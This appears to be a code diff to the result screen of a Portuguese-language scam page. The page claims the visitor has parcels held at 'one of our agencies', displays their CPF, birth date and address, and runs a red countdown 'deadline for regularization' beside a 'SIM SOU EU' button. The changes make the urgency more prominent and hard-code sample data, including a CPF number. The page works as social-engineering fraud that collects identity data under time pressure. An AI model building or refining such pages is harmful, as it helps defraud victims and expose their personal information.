@@ -620,17 +620,17 @@
     </section>
 
     <!-- Tela Resultado -->
-<section id="resultado">
+<section id="resultado" style="text-align: center;">
   <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
-  <p><span>Nome:</span> <span id="res-nome"></span></p>
-  <p><span>CPF:</span> <span id="res-cpf"></span></p>
-  <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
-  <p><span>CEP:</span> <span id="res-cep"></span></p>
-  <p><span>Rua:</span> <span id="res-rua"></span></p>
-  <p><span>Bairro:</span> <span id="res-bairro"></span></p>
-  <p><span>Cidade:</span> <span id="res-cidade"></span></p>
-  <p><span>Estado:</span> <span id="res-estado"></span></p>
-  <p><span>Prazo para Regularização:</span> <span id="res-prazo" style="color: rgb(175, 40, 40); font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Nome:</span> <span id="res-nome" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">CPF:</span> <span id="res-cpf" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Nascimento:</span> <span id="res-nascimento" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">CEP:</span> <span id="res-cep" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Rua:</span> <span id="res-rua" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Bairro:</span> <span id="res-bairro" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Cidade:</span> <span id="res-cidade" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Estado:</span> <span id="res-estado" style="font-weight: bold;"></span></p>
+  <p><span style="font-weight: normal;">Prazo para Regularização:</span> <span id="res-prazo" style="color: rgb(255, 0, 0); font-weight: bold;"></span></p>
 
   <div class="btn-container">
     <button id="btn-sim-sou-eu">SIM SOU EU</button>
@@ -667,8 +667,8 @@
     const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
     const seconds = Math.floor((diff % (1000 * 60)) / 1000);
     
-    // Update the display
-    prazoElement.innerHTML = `${formattedDate} às 23:59<br><span style="color: red;">${hours}h ${minutes}m ${seconds}s restantes</span>`;
+    // Update the display (tudo em vermelho)
+    prazoElement.innerHTML = `<span style="color: rgb(255, 0, 0);">${formattedDate} às 23:59 (Tempo restante: ${hours}h ${minutes}m ${seconds}s)</span>`;
     
     // Update every second
     setTimeout(atualizarContagemRegressiva, 1000);
@@ -676,6 +676,17 @@
 
   // Start the countdown when the page loads (or when results are shown)
   document.addEventListener('DOMContentLoaded', function() {
+    // Preenche os dados de exemplo
+    document.getElementById('res-nome').textContent = 'Cliente Exemplo';
+    document.getElementById('res-cpf').textContent = '209.068.077-60';
+    document.getElementById('res-nascimento').textContent = '01/01/1980';
+    document.getElementById('res-cep').textContent = '28390-000';
+    document.getElementById('res-rua').textContent = '';
+    document.getElementById('res-bairro').textContent = '';
+    document.getElementById('res-cidade').textContent = 'São Paulo';
+    document.getElementById('res-estado').textContent = 'SP';
+    
+    // Inicia a contagem regressiva
     atualizarContagemRegressiva();
   });
 </script>
